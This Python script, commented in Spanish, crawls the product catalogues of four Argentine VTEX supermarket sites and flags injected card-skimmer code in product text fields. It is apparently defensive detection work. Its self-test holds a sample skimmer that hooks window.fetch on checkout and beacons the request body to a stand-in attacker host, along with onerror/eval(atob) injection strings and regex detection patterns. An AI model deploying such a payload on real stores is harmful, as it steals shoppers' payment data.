#!/usr/bin/env python3
"""
deep_scan.py: recorre el catálogo COMPLETO de tiendas VTEX y busca código
inyectado (skimmers) en cualquier campo de texto de cada producto.

Solo usa la biblioteca estándar de Python 3.9+; no hace falta instalar nada.

    python deep_scan.py                      # jumbo, disco, vea, carrefour
    python deep_scan.py --stores jumbo,vea
    python deep_scan.py --no-sitemap         # solo el barrido por categorías (más rápido)

Cómo enumera (dos pases, para no perder productos):
  1. Árbol de categorías -> /api/catalog_system/pub/products/search?fq=C:/.../
     de a 50. VTEX corta el paginado en _from=2500, así que si una categoría
     tiene más productos se parte por subcategorías y, si hace falta, por
     rangos de precio (bisección).
  2. Sitemap de productos (/sitemap.xml -> product-N.xml). Todo producto que esté
     en el sitemap pero no apareció en el pase 1 (típicamente los sin stock,
     que la búsqueda oculta) se pide individualmente por su slug.

Qué analiza: TODOS los strings del JSON de cada producto (description,
metaTagDescription, especificaciones, nombres de SKU, etc.), después de
deshacer el escapado HTML. Decodifica base64 / fromCharCode / escapes y vuelve
a analizar lo decodificado. Un hallazgo es "ALTO" si hay ejecución de código
(handler on*=, <script>, eval/atob/Function, javascript:) o un payload
decodificado con comportamiento de skimmer.

Salidas en ./scan-out/<fecha>/:
  progress.log           el mismo progreso que se ve en consola
  findings.jsonl         un hallazgo por línea, con evidencia y payload decodificado
  findings.csv           resumen: tienda, id, nombre, link, campo, severidad, reglas, dominios
  payloads/<tienda>_<id>.txt   el campo sospechoso completo + lo decodificado
  summary.json           totales por tienda
"""
import argparse
import base64
import csv
import gzip
import html
import json
import os
import random
import re
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
import xml.etree.ElementTree as ET
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

STORES = {
    "jumbo": "https://www.jumbo.com.ar",
    "disco": "https://www.disco.com.ar",
    "vea": "https://www.vea.com.ar",
    "carrefour": "https://www.carrefour.com.ar",
}

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/130.0 Safari/537.36")
PAGE = 50            # VTEX: _to - _from <= 49
MAX_FROM = 2500      # VTEX no pagina más allá de esto
MAX_PRICE = 100_000_000

# ------------------------------------------------------------------ salida

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

_print_lock = threading.Lock()
_log_file = None


def log(msg):
    line = f"{datetime.now():%H:%M:%S} {msg}"
    with _print_lock:
        print(line, flush=True)
        if _log_file:
            _log_file.write(line + "\n")
            _log_file.flush()


# ------------------------------------------------------------------ HTTP


class Http:
    """GET con reintentos, backoff y un tope de requests por segundo por tienda."""

    def __init__(self, rps):
        self.min_gap = 1.0 / rps if rps > 0 else 0
        self.lock = threading.Lock()
        self.next_at = 0.0
        self.count = 0
        self.errors = 0

    def _throttle(self):
        with self.lock:
            now = time.monotonic()
            wait = self.next_at - now
            self.next_at = max(now, self.next_at) + self.min_gap
        if wait > 0:
            time.sleep(wait)

    def get(self, url, want_headers=False, tries=6):
        last = None
        for attempt in range(tries):
            self._throttle()
            req = urllib.request.Request(url, headers={
                "User-Agent": UA,
                "Accept": "application/json, text/xml, */*",
                "Accept-Encoding": "gzip",
                "Accept-Language": "es-AR,es;q=0.9",
            })
            try:
                with urllib.request.urlopen(req, timeout=40) as r:
                    body = r.read()
                    if r.headers.get("Content-Encoding") == "gzip":
                        body = gzip.decompress(body)
                    self.count += 1
                    text = body.decode("utf-8", errors="replace")
                    return (text, dict(r.headers)) if want_headers else text
            except urllib.error.HTTPError as e:
                last = e
                # 206 llega como éxito; 404 no se reintenta
                if e.code == 404:
                    self.count += 1
                    return (None, {}) if want_headers else None
                if e.code in (429, 500, 502, 503, 504, 408):
                    time.sleep(min(60, (2 ** attempt) + random.random() * 2))
                    continue
                if e.code == 403:
                    time.sleep(10 * (attempt + 1))
                    continue
                break
            except Exception as e:  # timeouts, resets
                last = e
                time.sleep(min(60, (2 ** attempt) + random.random() * 2))
        self.errors += 1
        raise RuntimeError(f"GET falló ({last}): {url}")


# ------------------------------------------------------------------ detección

TAG_HANDLER = re.compile(r"<[a-z][^>]*?\s(on[a-z]{3,20})\s*=", re.I | re.S)
RULES = [
    # (nombre, regex, severidad)
    ("handler-on*", TAG_HANDLER, "ALTO"),
    ("script-tag", re.compile(r"<\s*script\b", re.I), "ALTO"),
    ("javascript-url", re.compile(r"javascript\s*:", re.I), "ALTO"),
    ("eval", re.compile(r"\beval\s*\(", re.I), "ALTO"),
    ("atob", re.compile(r"\batob\s*\(", re.I), "ALTO"),
    ("new-Function", re.compile(r"\b(new\s+)?Function\s*\(\s*['\"`]", re.S), "ALTO"),
    ("fromCharCode", re.compile(r"fromCharCode\s*\(", re.I), "ALTO"),
    ("document.write", re.compile(r"document\s*\.\s*write", re.I), "ALTO"),
    ("createElement-script", re.compile(r"createElement\s*\(\s*['\"]script", re.I), "ALTO"),
    ("iframe", re.compile(r"<\s*iframe\b", re.I), "MEDIO"),
    ("object/embed", re.compile(r"<\s*(object|embed)\b", re.I), "MEDIO"),
    ("svg", re.compile(r"<\s*svg\b", re.I), "BAJO"),
    ("style-import", re.compile(r"@import|expression\s*\(", re.I), "BAJO"),
    ("form", re.compile(r"<\s*form\b", re.I), "MEDIO"),
    ("data-uri-html/js", re.compile(r"data:(text/html|application/javascript|text/javascript)", re.I), "ALTO"),
]
# Comportamiento de skimmer; se busca sobre el texto y sobre lo decodificado.
BEHAVIOR = [
    ("hook-fetch/xhr", re.compile(r"window\.fetch\s*=|XMLHttpRequest\.prototype|\.prototype\.send\s*=|\.prototype\.open\s*=")),
    ("exfil-beacon/ws", re.compile(r"sendBeacon|new\s+WebSocket|new\s+Image\s*\(\s*\)\s*\.src|\.src\s*=\s*['\"]https?://")),
    ("checkout/orderForm", re.compile(r"orderForm|/checkout|vtexjs\.checkout|paymentData|cardNumber|card_number|cvv|cvc|ccnum|expir", re.I)),
    ("lee-inputs", re.compile(r"querySelectorAll?\s*\(\s*['\"][^'\"]*input|addEventListener\s*\(\s*['\"](change|input|blur|keyup|submit)", re.I)),
    ("ofuscación", re.compile(r"_0x[0-9a-f]{4,}|\\x[0-9a-f]{2}\\x[0-9a-f]{2}|\\u00[0-9a-f]{2}\\u00", re.I)),
]
B64 = re.compile(r"(?<![A-Za-z0-9+/_-])([A-Za-z0-9+/_-]{60,}={0,2})(?![A-Za-z0-9+/_-])")
CHARCODES = re.compile(r"fromCharCode\s*\(\s*((?:\d{1,5}\s*,\s*){6,}\d{1,5})\s*\)")
URL_RE = re.compile(r"(?:https?:)?//([a-z0-9][a-z0-9.-]*\.[a-z]{2,})", re.I)
JS_HINT = re.compile(r"function|=>|window\.|document\.|fetch\(|var |let |const |\beval\b|atob|XMLHttpRequest|sendBeacon", re.I)

# Hosts propios / de plataforma: aparecer como destino no es sospechoso.
BENIGN_HOSTS = (
    "vtexassets.com", "vteximg.com.br", "vtex.com.br", "vtex.com", "vtexcommercestable.com.br",
    "jumbo.com.ar", "disco.com.ar", "vea.com.ar", "carrefour.com.ar", "cencosud.com.ar",
    "youtube.com", "youtu.be", "w3.org", "google.com", "gstatic.com", "googleapis.com",
)


def looks_like_text(b):
    if len(b) < 16:
        return None
    try:
        s = b.decode("utf-8")
    except UnicodeDecodeError:
        return None
    ok = sum(1 for c in s if c in "\n\r\t" or (ord(c) >= 0x20 and ord(c) != 0x7f))
    return s if ok / max(1, len(s)) > 0.95 else None


def b64_text(s):
    for fn in (base64.b64decode, base64.urlsafe_b64decode):
        try:
            pad = s + "=" * (-len(s) % 4)
            t = looks_like_text(fn(pad))
            if t:
                return t
        except Exception:
            pass
    return None


def reveal(text, depth=0):
    """Payloads escondidos (base64 / charcodes), recursivo hasta 3 niveles."""
    out = []
    if depth > 3:
        return out
    for m in B64.finditer(text):
        t = b64_text(m.group(1))
        if t:
            out.append(("base64", t))
            out.extend(reveal(t, depth + 1))
    for m in CHARCODES.finditer(text):
        try:
            t = "".join(chr(int(n)) for n in m.group(1).split(","))
            out.append(("fromCharCode", t))
            out.extend(reveal(t, depth + 1))
        except Exception:
            pass
    return out


def external_hosts(text):
    hosts = set()
    for h in URL_RE.findall(text):
        h = h.lower().rstrip(".")
        if not any(h == b or h.endswith("." + b) for b in BENIGN_HOSTS):
            hosts.add(h)
    return sorted(hosts)


def analyze_string(raw):
    """Devuelve None o un dict con severidad, reglas, evidencia y payloads."""
    if not raw or len(raw) < 6:
        return None
    # Varias capas de escapado: &amp;lt;img ... -> <img
    text = raw
    for _ in range(3):
        un = html.unescape(text)
        if un == text:
            break
        text = un
    text_nl = text.replace("\\/", "/")

    hits, sev = [], None
    rank = {"BAJO": 1, "MEDIO": 2, "ALTO": 3}

    def bump(s):
        nonlocal sev
        if sev is None or rank[s] > rank[sev]:
            sev = s

    first_pos = None
    for name, rx, s in RULES:
        m = rx.search(text_nl)
        if m:
            label = f"{name}({m.group(1).lower()})" if name == "handler-on*" else name
            hits.append(label)
            bump(s)
            first_pos = m.start() if first_pos is None else min(first_pos, m.start())

    hidden = reveal(text_nl)
    hidden_js = [(enc, t) for enc, t in hidden if JS_HINT.search(t)]
    if hidden_js:
        hits.append("payload-js-codificado(" + ",".join(sorted({e for e, _ in hidden_js})) + ")")
        bump("ALTO")

    corpus = text_nl + "\n" + "\n".join(t for _, t in hidden)
    behaviors = [name for name, rx in BEHAVIOR if rx.search(corpus)]
    # Comportamiento solo cuenta si además hay código (evita falsos positivos con
    # textos que dicen "checkout" o "tarjeta").
    if behaviors and (sev == "ALTO" or hidden_js):
        hits.extend("comportamiento:" + b for b in behaviors)

    if not hits:
        return None
    # "svg" o "@import" solos, sin nada más: ruido de maquetado
    if sev == "BAJO" and not hidden:
        return {"severity": "BAJO", "rules": hits, "evidence": snippet(text_nl, first_pos),
                "hosts": [], "decoded": []}

    hosts = external_hosts(corpus) if (sev in ("ALTO", "MEDIO")) else []
    return {
        "severity": sev,
        "rules": hits,
        "evidence": snippet(text_nl, first_pos),
        "hosts": hosts,
        "decoded": [{"encoding": e, "text": t[:20000]} for e, t in hidden],
        "full": text_nl if len(text_nl) < 200_000 else text_nl[:200_000],
    }


def snippet(text, pos, width=300):
    if pos is None:
        pos = 0
    a = max(0, pos - 60)
    return text[a:a + width].replace("\n", " ")


def walk_strings(obj, path=""):
    if isinstance(obj, str):
        yield path, obj
    elif isinstance(obj, dict):
        for k, v in obj.items():
            yield from walk_strings(v, f"{path}.{k}" if path else str(k))
    elif isinstance(obj, list):
        for i, v in enumerate(obj):
            yield from walk_strings(v, f"{path}[{i}]")


# Campos que no son texto editable de catálogo (imágenes, ids, precios...).
SKIP_KEYS = re.compile(r"(imageUrl|imageTag|imageText|imageLabel|ean|itemId|productId|sellerId|referenceId|"
                       r"categoryId|brandId|Price|Installments|Teasers|PromotionTeasers|DiscountHighLight|"
                       r"GiftSkuIds|BuyTogether|ItemMetadataAttachment|PaymentOptions|addToCartLink)", re.I)


def analyze_product(prod):
    findings = []
    for path, s in walk_strings(prod):
        last = path.rsplit(".", 1)[-1]
        if SKIP_KEYS.search(last) and "<" not in s:
            continue
        r = analyze_string(s)
        if r:
            r["field"] = path
            findings.append(r)
    return findings


# ------------------------------------------------------------------ escaneo


class StoreScan:
    def __init__(self, key, base, out, args):
        self.key, self.base, self.out, self.args = key, base, out, args
        self.http = Http(args.rps)
        self.seen = {}           # productId -> linkText
        self.seen_links = set()
        self.findings = 0
        self.high = 0
        self.low = 0
        self.lock = threading.Lock()
        self.last_report = 0.0
        self.phase = ""
        self.started = time.monotonic()

    # -------------------------------------------------------------- helpers
    def search_url(self, fq_list, frm, to):
        q = [("fq", f) for f in fq_list] + [("_from", frm), ("_to", to)]
        return f"{self.base}/api/catalog_system/pub/products/search?" + urllib.parse.urlencode(q, quote_via=urllib.parse.quote)

    def fetch_page(self, fq_list, frm):
        text, hdr = self.http.get(self.search_url(fq_list, frm, frm + PAGE - 1), want_headers=True)
        total = None
        res = {k.lower(): v for k, v in hdr.items()}.get("resources")
        if res and "/" in res:
            try:
                total = int(res.split("/")[-1])
            except ValueError:
                pass
        data = json.loads(text) if text else []
        return data if isinstance(data, list) else [], total

    def progress(self, force=False):
        now = time.monotonic()
        if not force and now - self.last_report < self.args.every:
            return
        self.last_report = now
        mins = (now - self.started) / 60
        log(f"[{self.key}] {self.phase} | {len(self.seen):,} productos escaneados | "
            f"{self.high} sospechosos ALTO/MEDIO, {self.low} bajos | {self.http.count:,} requests, "
            f"{self.http.errors} errores | {mins:.1f} min")

    def handle(self, prods):
        for p in prods:
            pid = str(p.get("productId") or p.get("linkText") or id(p))
            with self.lock:
                if pid in self.seen:
                    continue
                self.seen[pid] = p.get("linkText")
                if p.get("linkText"):
                    self.seen_links.add(p["linkText"].lower())
            for f in analyze_product(p):
                self.record(p, f)
        self.progress()

    def record(self, p, f):
        link = f"{self.base}/{p.get('linkText', '')}/p"
        row = {
            "store": self.key,
            "productId": p.get("productId"),
            "name": p.get("productName"),
            "brand": p.get("brand"),
            "link": link,
            "field": f["field"],
            "severity": f["severity"],
            "rules": f["rules"],
            "hosts": f["hosts"],
            "evidence": f["evidence"],
            "decoded": f.get("decoded", []),
            "categories": (p.get("categories") or [])[:1],
            "found_at": datetime.now().isoformat(timespec="seconds"),
        }
        with self.lock:
            self.findings += 1
            if f["severity"] in ("ALTO", "MEDIO"):
                self.high += 1
            else:
                self.low += 1
            self.out.write_finding(row, f.get("full"))
        if f["severity"] in ("ALTO", "MEDIO") and self.args.redact:
            log(f"[{self.key}] !!! hallazgo {f['severity']} (detalle en el artifact)")
        elif f["severity"] in ("ALTO", "MEDIO"):
            log(f"[{self.key}] !!! {f['severity']} {p.get('productId')} \"{p.get('productName')}\" "
                f"campo={f['field']} reglas={','.join(f['rules'])} hosts={','.join(f['hosts']) or '-'}")

    # -------------------------------------------------------------- pase 1
    def category_tree(self):
        txt = self.http.get(f"{self.base}/api/catalog_system/pub/category/tree/10")
        return json.loads(txt) if txt else []

    def crawl_fq(self, fq, children, label):
        """Recorre un filtro; si pasa de 2500 baja a hijos o parte por precio."""
        prods, total = self.fetch_page(fq, 0)
        self.handle(prods)
        if total is None:
            total = len(prods) if len(prods) < PAGE else MAX_FROM + 1
        if total <= MAX_FROM + PAGE:
            self.page_through(fq, total)
            return
        if children:
            for ch in children:
                self.crawl_fq([f"C:{ch['_path']}"], ch.get("children") or [], ch.get("name"))
            # lo que esté colgado directo del padre y no de un hijo: por precio
            self.crawl_price(fq, 0, MAX_PRICE, label)
        else:
            self.crawl_price(fq, 0, MAX_PRICE, label)

    def page_through(self, fq, total):
        frm = PAGE
        limit = min(total, MAX_FROM + PAGE)
        while frm < limit:
            prods, _ = self.fetch_page(fq, frm)
            if not prods:
                break
            self.handle(prods)
            frm += PAGE

    def crawl_price(self, fq, lo, hi, label, depth=0):
        f = fq + [f"P:[{lo} TO {hi}]"]
        prods, total = self.fetch_page(f, 0)
        self.handle(prods)
        if total is None or total <= MAX_FROM + PAGE or hi - lo < 1 or depth > 30:
            if total and total > MAX_FROM + PAGE:
                log(f"[{self.key}] aviso: {label} precio {lo}-{hi} tiene {total} y no se puede partir más")
            self.page_through(f, total or 0)
            return
        mid = (lo + hi) / 2
        mid = round(mid, 2)
        self.crawl_price(fq, lo, mid, label, depth + 1)
        self.crawl_price(fq, round(mid + 0.01, 2), hi, label, depth + 1)

    def pass_categories(self):
        self.phase = "pase 1 categorías"
        tree = self.category_tree()

        def annotate(nodes, prefix):
            for n in nodes:
                n["_path"] = f"{prefix}{n['id']}/"
                annotate(n.get("children") or [], n["_path"])

        annotate(tree, "/")
        log(f"[{self.key}] {len(tree)} categorías de primer nivel")
        with ThreadPoolExecutor(max_workers=self.args.workers) as ex:
            futs = {ex.submit(self.crawl_fq, [f"C:{n['_path']}"], n.get("children") or [], n.get("name")): n
                    for n in tree}
            done = 0
            for fut in as_completed(futs):
                done += 1
                n = futs[fut]
                try:
                    fut.result()
                except Exception as e:
                    log(f"[{self.key}] error en categoría {n.get('name')}: {e}")
                self.phase = f"pase 1 categorías {done}/{len(tree)}"
                log(f"[{self.key}] categoría lista: {n.get('name')} ({done}/{len(tree)})")
                self.progress(force=True)

    # -------------------------------------------------------------- pase 2
    def sitemap_links(self):
        links = set()
        idx = self.http.get(f"{self.base}/sitemap.xml")
        if not idx:
            return links
        locs = re.findall(r"<loc>\s*([^<\s]+)\s*</loc>", idx)
        maps = [u for u in locs if "product" in u.lower()]
        for u in maps:
            try:
                sp = urllib.parse.urlsplit(html.unescape(u))
                xml = self.http.get(self.base + sp.path + (("?" + sp.query) if sp.query else ""))
            except Exception as e:
                log(f"[{self.key}] sitemap {u}: {e}")
                continue
            for loc in re.findall(r"<loc>\s*([^<\s]+)\s*</loc>", xml or ""):
                path = urllib.parse.urlsplit(html.unescape(loc)).path
                m = re.match(r"^/(.+)/p/?$", path)
                if m:
                    links.add(urllib.parse.unquote(m.group(1)))
        return links

    def pass_sitemap(self):
        self.phase = "pase 2 sitemap (leyendo)"
        links = self.sitemap_links()
        missing = [l for l in links if l.lower() not in self.seen_links]
        log(f"[{self.key}] sitemap: {len(links):,} productos; {len(missing):,} no aparecieron en el pase 1")
        if self.args.sitemap_limit:
            missing = missing[: self.args.sitemap_limit]
        done = 0

        def one(slug):
            url = f"{self.base}/api/catalog_system/pub/products/search/{urllib.parse.quote(slug)}/p"
            txt = self.http.get(url)
            data = json.loads(txt) if txt else []
            if isinstance(data, list):
                self.handle(data)

        with ThreadPoolExecutor(max_workers=self.args.workers) as ex:
            for fut in as_completed([ex.submit(one, s) for s in missing]):
                done += 1
                try:
                    fut.result()
                except Exception as e:
                    log(f"[{self.key}] error sitemap: {e}")
                self.phase = f"pase 2 sitemap {done:,}/{len(missing):,}"
                self.progress()

    def run(self):
        log(f"[{self.key}] arrancando {self.base}")
        try:
            self.pass_categories()
        except Exception as e:
            log(f"[{self.key}] el pase de categorías falló: {e}")
        if not self.args.no_sitemap:
            try:
                self.pass_sitemap()
            except Exception as e:
                log(f"[{self.key}] el pase de sitemap falló: {e}")
        self.phase = "TERMINADO"
        self.progress(force=True)
        return {"store": self.key, "products": len(self.seen), "suspicious": self.high,
                "low": self.low, "requests": self.http.count, "errors": self.http.errors,
                "minutes": round((time.monotonic() - self.started) / 60, 1)}


class Output:
    def __init__(self, folder):
        self.folder = folder
        os.makedirs(os.path.join(folder, "payloads"), exist_ok=True)
        self.lock = threading.Lock()
        self.jsonl = open(os.path.join(folder, "findings.jsonl"), "a", encoding="utf-8")
        new_csv = not os.path.exists(os.path.join(folder, "findings.csv"))
        self.csvf = open(os.path.join(folder, "findings.csv"), "a", encoding="utf-8-sig", newline="")
        self.csv = csv.writer(self.csvf)
        if new_csv:
            self.csv.writerow(["tienda", "severidad", "productId", "producto", "link", "campo",
                               "reglas", "dominios_externos", "evidencia"])

    def write_finding(self, row, full):
        with self.lock:
            self.jsonl.write(json.dumps(row, ensure_ascii=False) + "\n")
            self.jsonl.flush()
            self.csv.writerow([row["store"], row["severity"], row["productId"], row["name"], row["link"],
                               row["field"], " ".join(row["rules"]), " ".join(row["hosts"]),
                               row["evidence"][:300]])
            self.csvf.flush()
            if row["severity"] in ("ALTO", "MEDIO"):
                fn = os.path.join(self.folder, "payloads",
                                  f"{row['store']}_{row['productId']}_{re.sub(r'[^A-Za-z0-9]+', '_', row['field'])[:60]}.txt")
                with open(fn, "w", encoding="utf-8") as fh:
                    fh.write(f"{row['name']}\n{row['link']}\ncampo: {row['field']}\n"
                             f"reglas: {row['rules']}\nhosts: {row['hosts']}\n\n=== CAMPO COMPLETO ===\n")
                    fh.write(full or row["evidence"])
                    for d in row["decoded"]:
                        fh.write(f"\n\n=== DECODIFICADO ({d['encoding']}) ===\n{d['text']}")


def main():
    global _log_file
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--stores", default=",".join(STORES), help="tiendas separadas por coma")
    ap.add_argument("--out", default=None, help="carpeta de salida")
    ap.add_argument("--workers", type=int, default=4, help="hilos por tienda")
    ap.add_argument("--rps", type=float, default=6, help="requests por segundo máximo, por tienda")
    ap.add_argument("--every", type=float, default=20, help="segundos entre líneas de progreso")
    ap.add_argument("--no-sitemap", action="store_true", help="saltear el pase 2 (sitemap)")
    ap.add_argument("--sitemap-limit", type=int, default=0, help="tope de productos del pase 2 (0 = todos)")
    ap.add_argument("--redact", action="store_true", help="no mostrar nombres de productos en consola")
    ap.add_argument("--self-test", action="store_true", help="probar los detectores sin red")
    args = ap.parse_args()

    if args.self_test:
        return self_test()

    keys = [k.strip() for k in args.stores.split(",") if k.strip()]
    for k in keys:
        if k not in STORES:
            sys.exit(f"tienda desconocida: {k} (opciones: {', '.join(STORES)})")
    folder = args.out or os.path.join("scan-out", datetime.now().strftime("%Y%m%d-%H%M"))
    out = Output(folder)
    _log_file = open(os.path.join(folder, "progress.log"), "a", encoding="utf-8")
    log(f"Escaneo profundo de {', '.join(keys)} -> {os.path.abspath(folder)}")

    results = []
    with ThreadPoolExecutor(max_workers=len(keys)) as ex:
        futs = [ex.submit(StoreScan(k, STORES[k], out, args).run) for k in keys]
        for f in as_completed(futs):
            results.append(f.result())

    with open(os.path.join(folder, "summary.json"), "w", encoding="utf-8") as fh:
        json.dump(results, fh, indent=2, ensure_ascii=False)
    log("=" * 70)
    for r in sorted(results, key=lambda r: r["store"]):
        log(f"{r['store']:<10} {r['products']:>8,} productos  {r['suspicious']:>4} sospechosos  "
            f"{r['low']:>4} bajos  {r['errors']} errores  {r['minutes']} min")
    log(f"Detalle: {os.path.abspath(os.path.join(folder, 'findings.csv'))}")


def self_test():
    payload = ("(function(){var t='https://collector.attacker.invalid/c';var f=window.fetch;"
               "window.fetch=function(u,o){if(String(u).indexOf('/checkout')>-1)navigator.sendBeacon(t,btoa(o.body));"
               "return f.apply(this,arguments)}})();")
    b64 = base64.b64encode(payload.encode()).decode()
    cases = {
        "skimmer img onerror": (f'Aceite puro<img src="x" onerror="eval(atob(\'{b64}\'))">', "ALTO"),
        "escapado html": (html.escape(f'<img src=x onerror="eval(atob(\'{b64}\'))">'), "ALTO"),
        "doble escapado": (html.escape(html.escape('<script>alert(1)</script>')), "ALTO"),
        "meta con base64 suelto": (f"Galletitas ricas {b64}", "ALTO"),
        "descripcion normal": ("Aceite de girasol 1,5 L. Ideal para cocinar. <b>Sin TACC</b>", None),
        "img normal": ('<p>Rico</p><img src="https://jumboargentina.vtexassets.com/a.jpg">', None),
        "texto con checkout": ("Pagá en el checkout con tarjeta de crédito", None),
        "iframe youtube": ('<iframe src="https://www.youtube.com/embed/x"></iframe>', "MEDIO"),
    }
    ok = True
    for name, (s, want) in cases.items():
        r = analyze_string(s)
        got = r["severity"] if r else None
        flag = "OK " if got == want else "MAL"
        ok &= got == want
        print(f"{flag} {name:<25} esperado={want} obtenido={got} {r['rules'] if r else ''} "
              f"{r['hosts'] if r else ''}")
    prod = {"productId": "1", "productName": "X", "linkText": "x", "metaTagDescription": cases["skimmer img onerror"][0],
            "items": [{"images": [{"imageUrl": "https://a.vteximg.com.br/x.jpg"}]}]}
    fs = analyze_product(prod)
    print("producto:", [(f["field"], f["severity"]) for f in fs])
    ok &= len(fs) == 1 and fs[0]["field"] == "metaTagDescription"
    print("TODO OK" if ok else "HAY FALLAS")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
